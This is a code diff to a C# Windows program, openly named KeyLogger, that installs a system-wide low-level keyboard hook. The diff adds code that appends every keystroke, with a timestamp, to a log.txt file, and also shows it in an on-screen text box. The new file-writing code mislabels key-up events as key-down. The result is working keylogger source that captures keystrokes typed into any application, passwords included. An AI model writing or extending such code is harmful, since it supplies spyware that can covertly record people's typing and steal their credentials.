@@ -1,6 +1,5 @@
 using System.Diagnostics;
 using System.Runtime.InteropServices;
-using System.Text;
 
 namespace KeyLogger;
 
@@ -14,15 +13,16 @@ public class Program
     public static extern nint CallNextHookEx(nint hhk, int nCode, nint wParam, nint lParam);
 
     private static int WH_KEYBOARD_LL = 13;
-    private static int WM_KEYDOWN = 0x100;
+    private static int WM_KEYDOWN = 0x0100;
+    private static int WM_SYSKEYDOWN = 0x0104;
     private static int WM_KEYUP = 0x0101;
 
-    private static TextBox outputTextBox;
+    private static TextBox? outputTextBox;
 
     public static void Main(string[] args)
     {
         ApplicationConfiguration.Initialize();
-        Form1 form = new Form1();
+        KeyLogger form = new KeyLogger();
         outputTextBox = form.OutputTextBox;
 
         // Redirect console output to the TextBox
@@ -31,7 +31,7 @@ public class Program
 
         HookCallbackDelegate hcDelegate = HookCallback;
 
-        string mainModuleName = Process.GetCurrentProcess().MainModule.ModuleName;
+        string mainModuleName = Process.GetCurrentProcess()!.MainModule!.ModuleName;
         nint hook = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);
 
         Application.Run(form);
@@ -41,42 +41,26 @@ public class Program
     {
         if (nCode >= 0)
         {
+            string path = Path.Combine(Environment.CurrentDirectory, "log.txt");
             int vkCode = Marshal.ReadInt32(lParam);
             string timeStamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.f");
+            using (StreamWriter sw = new StreamWriter(path, true) { AutoFlush = true })
+            {
+                if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+                {
+                    sw.WriteLineAsync($"{timeStamp} - [KeyDown: {(Keys)vkCode}]");
+                    Console.WriteLine($"{timeStamp} - [KeyDown: {(Keys)vkCode}]");
+                }
+                else if (wParam == WM_KEYUP)
+                {
+                    sw.WriteLineAsync($"{timeStamp} - [KeyDown: {(Keys)vkCode}]");
+                    Console.WriteLine($"{timeStamp} - [KeyUp: {(Keys)vkCode}]");
+                }
+            }
 
-            if (wParam == WM_KEYDOWN)
-            {
-                Console.WriteLine($"{timeStamp} - [KeyDown: {(Keys)vkCode}]");
-            }
-            else if (wParam == WM_KEYUP)
-            {
-                Console.WriteLine($"{timeStamp} - [KeyUp: {(Keys)vkCode}]");
-            }
         }
         return CallNextHookEx(nint.Zero, nCode, wParam, lParam);
     }
 
     public delegate nint HookCallbackDelegate(int nCode, nint wParam, nint lParam);
-}
-
-public class TextBoxWriter : TextWriter
-{
-    private readonly TextBox _textBox;
-
-    public TextBoxWriter(TextBox textBox)
-    {
-        _textBox = textBox;
-    }
-
-    public override void Write(char value)
-    {
-        _textBox.Invoke((Action)(() => _textBox.AppendText(value.ToString())));
-    }
-
-    public override void Write(string value)
-    {
-        _textBox.Invoke((Action)(() => _textBox.AppendText(value)));
-    }
-
-    public override Encoding Encoding => Encoding.UTF8;
 }
